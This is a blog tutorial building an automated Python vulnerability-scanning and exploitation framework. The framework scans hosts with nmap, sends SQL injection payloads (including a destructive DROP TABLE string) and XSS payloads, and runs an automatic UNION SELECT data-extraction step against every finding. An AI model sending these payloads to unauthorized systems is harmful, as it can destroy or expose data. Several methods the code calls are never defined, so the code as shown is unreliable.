---
layout: post
title: "Building an Automated VAPT Framework with Python"
date: 2025-01-10 09:15:00 +0530
categories: Tools Development
---

In this post, I'll walk you through building a comprehensive automated Vulnerability Assessment and Penetration Testing (VAPT) framework using Python. This framework can be used to automate routine security testing tasks and improve the efficiency of security assessments.

## Framework Architecture

Our VAPT framework consists of several key components:

1. **Target Discovery Module**: Identifies live hosts and services
2. **Vulnerability Scanner**: Detects common vulnerabilities
3. **Exploitation Module**: Attempts to exploit discovered vulnerabilities
4. **Reporting Engine**: Generates comprehensive reports
5. **Plugin System**: Allows for easy extension

## Core Framework Structure

```python
#!/usr/bin/env python3
"""
VAPT Framework - Automated Vulnerability Assessment and Penetration Testing
Author: Gaurav Singh
"""

import argparse
import json
import logging
from datetime import datetime
from typing import List, Dict, Any

class VAPTFramework:
    def __init__(self, config_file: str = None):
        self.config = self.load_config(config_file)
        self.setup_logging()
        self.vulnerabilities = []
        self.exploits = []
        
    def load_config(self, config_file: str) -> Dict[str, Any]:
        """Load configuration from JSON file"""
        default_config = {
            "scan_timeout": 300,
            "max_threads": 10,
            "output_format": "json",
            "plugins_dir": "./plugins"
        }
        
        if config_file:
            try:
                with open(config_file, 'r') as f:
                    return {**default_config, **json.load(f)}
            except FileNotFoundError:
                logging.warning(f"Config file {config_file} not found, using defaults")
        
        return default_config
    
    def setup_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('vapt_framework.log'),
                logging.StreamHandler()
            ]
        )
```

## Target Discovery Module

```python
import nmap
import socket
from concurrent.futures import ThreadPoolExecutor
import subprocess

class TargetDiscovery:
    def __init__(self, framework):
        self.framework = framework
        self.nm = nmap.PortScanner()
    
    def discover_hosts(self, target_range: str) -> List[str]:
        """Discover live hosts in the given range"""
        logging.info(f"Discovering hosts in range: {target_range}")
        
        try:
            self.nm.scan(hosts=target_range, arguments='-sn')
            live_hosts = []
            
            for host in self.nm.all_hosts():
                if self.nm[host].state() == 'up':
                    live_hosts.append(host)
                    logging.info(f"Live host discovered: {host}")
            
            return live_hosts
        except Exception as e:
            logging.error(f"Host discovery failed: {e}")
            return []
    
    def port_scan(self, host: str, ports: str = "1-1000") -> Dict[str, Any]:
        """Perform port scan on target host"""
        logging.info(f"Scanning ports on {host}")
        
        try:
            self.nm.scan(host, ports, arguments='-sV -sC')
            scan_result = {
                'host': host,
                'ports': [],
                'os_info': None
            }
            
            if host in self.nm.all_hosts():
                for port in self.nm[host]['tcp'].keys():
                    port_info = self.nm[host]['tcp'][port]
                    scan_result['ports'].append({
                        'port': port,
                        'state': port_info['state'],
                        'service': port_info.get('name', 'unknown'),
                        'version': port_info.get('version', 'unknown')
                    })
            
            return scan_result
        except Exception as e:
            logging.error(f"Port scan failed for {host}: {e}")
            return {'host': host, 'ports': [], 'os_info': None}
```

## Vulnerability Scanner Module

```python
import requests
from urllib.parse import urljoin
import re

class VulnerabilityScanner:
    def __init__(self, framework):
        self.framework = framework
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'VAPT-Framework/1.0'
        })
    
    def scan_web_vulnerabilities(self, target_url: str) -> List[Dict[str, Any]]:
        """Scan for common web vulnerabilities"""
        vulnerabilities = []
        
        # SQL Injection Tests
        sqli_vulns = self.test_sql_injection(target_url)
        vulnerabilities.extend(sqli_vulns)
        
        # XSS Tests
        xss_vulns = self.test_xss(target_url)
        vulnerabilities.extend(xss_vulns)
        
        # Directory Traversal Tests
        dir_traversal_vulns = self.test_directory_traversal(target_url)
        vulnerabilities.extend(dir_traversal_vulns)
        
        return vulnerabilities
    
    def test_sql_injection(self, url: str) -> List[Dict[str, Any]]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT null, null, null--",
            "'; DROP TABLE users; --",
            "' OR SLEEP(5)--"
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.get(url, params={'id': payload}, timeout=10)
                
                # Check for SQL error messages
                error_patterns = [
                    r"sql syntax error",
                    r"mysql_fetch_array",
                    r"ORA-\d{5}",
                    r"PostgreSQL.*ERROR",
                    r"Warning.*mysql_"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'url': url,
                            'payload': payload,
                            'description': 'SQL injection vulnerability detected'
                        })
                        break
                        
            except requests.RequestException as e:
                logging.error(f"Request failed for SQL injection test: {e}")
        
        return vulnerabilities
    
    def test_xss(self, url: str) -> List[Dict[str, Any]]:
        """Test for Cross-Site Scripting vulnerabilities"""
        vulnerabilities = []
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            try:
                response = self.session.get(url, params={'search': payload}, timeout=10)
                
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'Medium',
                        'url': url,
                        'payload': payload,
                        'description': 'Reflected XSS vulnerability detected'
                    })
                    
            except requests.RequestException as e:
                logging.error(f"Request failed for XSS test: {e}")
        
        return vulnerabilities
```

## Exploitation Module

```python
class ExploitationEngine:
    def __init__(self, framework):
        self.framework = framework
        self.exploits = {}
        self.load_exploits()
    
    def load_exploits(self):
        """Load available exploits"""
        self.exploits = {
            'SQL Injection': self.exploit_sql_injection,
            'Cross-Site Scripting (XSS)': self.exploit_xss,
            'Directory Traversal': self.exploit_directory_traversal
        }
    
    def exploit_vulnerability(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt to exploit a discovered vulnerability"""
        vuln_type = vulnerability.get('type')
        
        if vuln_type in self.exploits:
            logging.info(f"Attempting to exploit {vuln_type}")
            return self.exploits[vuln_type](vulnerability)
        else:
            logging.warning(f"No exploit available for {vuln_type}")
            return {'success': False, 'message': 'No exploit available'}
    
    def exploit_sql_injection(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit SQL injection vulnerability"""
        url = vulnerability['url']
        
        # Attempt to extract database information
        union_payload = "' UNION SELECT version(), user(), database()--"
        
        try:
            response = requests.get(url, params={'id': union_payload}, timeout=10)
            
            # Look for database information in response
            if any(keyword in response.text.lower() for keyword in ['mysql', 'postgresql', 'oracle']):
                return {
                    'success': True,
                    'message': 'Successfully extracted database information',
                    'data': 'Database version and user information retrieved'
                }
        except Exception as e:
            logging.error(f"SQL injection exploit failed: {e}")
        
        return {'success': False, 'message': 'Exploitation failed'}
```

## Reporting Engine

```python
import json
from jinja2 import Template
from datetime import datetime

class ReportGenerator:
    def __init__(self, framework):
        self.framework = framework
    
    def generate_report(self, scan_results: Dict[str, Any], output_file: str = None) -> str:
        """Generate comprehensive security assessment report"""
        
        report_data = {
            'scan_date': datetime.now().isoformat(),
            'targets': scan_results.get('targets', []),
            'vulnerabilities': scan_results.get('vulnerabilities', []),
            'exploits': scan_results.get('exploits', []),
            'summary': self.generate_summary(scan_results)
        }
        
        if self.framework.config['output_format'] == 'json':
            return self.generate_json_report(report_data, output_file)
        elif self.framework.config['output_format'] == 'html':
            return self.generate_html_report(report_data, output_file)
        else:
            return self.generate_text_report(report_data, output_file)
    
    def generate_summary(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate executive summary"""
        vulnerabilities = scan_results.get('vulnerabilities', [])
        
        severity_counts = {'High': 0, 'Medium': 0, 'Low': 0}
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Low')
            severity_counts[severity] += 1
        
        return {
            'total_vulnerabilities': len(vulnerabilities),
            'severity_breakdown': severity_counts,
            'risk_level': self.calculate_risk_level(severity_counts)
        }
    
    def calculate_risk_level(self, severity_counts: Dict[str, int]) -> str:
        """Calculate overall risk level"""
        if severity_counts['High'] > 0:
            return 'Critical'
        elif severity_counts['Medium'] > 2:
            return 'High'
        elif severity_counts['Medium'] > 0 or severity_counts['Low'] > 5:
            return 'Medium'
        else:
            return 'Low'
```

## Usage Example

```python
def main():
    parser = argparse.ArgumentParser(description='VAPT Framework')
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-c', '--config', help='Configuration file')
    parser.add_argument('-o', '--output', help='Output file')
    
    args = parser.parse_args()
    
    # Initialize framework
    framework = VAPTFramework(args.config)
    
    # Initialize modules
    discovery = TargetDiscovery(framework)
    scanner = VulnerabilityScanner(framework)
    exploit_engine = ExploitationEngine(framework)
    reporter = ReportGenerator(framework)
    
    # Perform assessment
    logging.info("Starting VAPT assessment")
    
    # Discover targets
    hosts = discovery.discover_hosts(args.target)
    
    # Scan for vulnerabilities
    all_vulns = []
    for host in hosts:
        port_info = discovery.port_scan(host)
        vulns = scanner.scan_web_vulnerabilities(f"http://{host}")
        all_vulns.extend(vulns)
    
    # Attempt exploitation
    exploits = []
    for vuln in all_vulns:
        exploit_result = exploit_engine.exploit_vulnerability(vuln)
        if exploit_result['success']:
            exploits.append(exploit_result)
    
    # Generate report
    scan_results = {
        'targets': hosts,
        'vulnerabilities': all_vulns,
        'exploits': exploits
    }
    
    report = reporter.generate_report(scan_results, args.output)
    logging.info(f"Assessment complete. Report saved to: {report}")

if __name__ == "__main__":
    main()
```

## Conclusion

This VAPT framework provides a solid foundation for automated security testing. It can be easily extended with additional modules and plugins to cover more vulnerability types and testing scenarios.

Key features include:
- Modular architecture for easy extension
- Comprehensive vulnerability detection
- Automated exploitation capabilities  
- Professional reporting
- Configurable scanning options

The framework follows ethical hacking principles and should only be used on systems you own or have explicit permission to test.

## Next Steps

Future enhancements planned:
1. Integration with popular security tools (Nessus, OpenVAS)
2. Machine learning for vulnerability classification
3. Custom payload generation
4. Integration with bug bounty platforms
5. Real-time dashboard for monitoring scans

---

*This framework is part of my ongoing security research and development efforts. Use responsibly and only on authorized targets.*
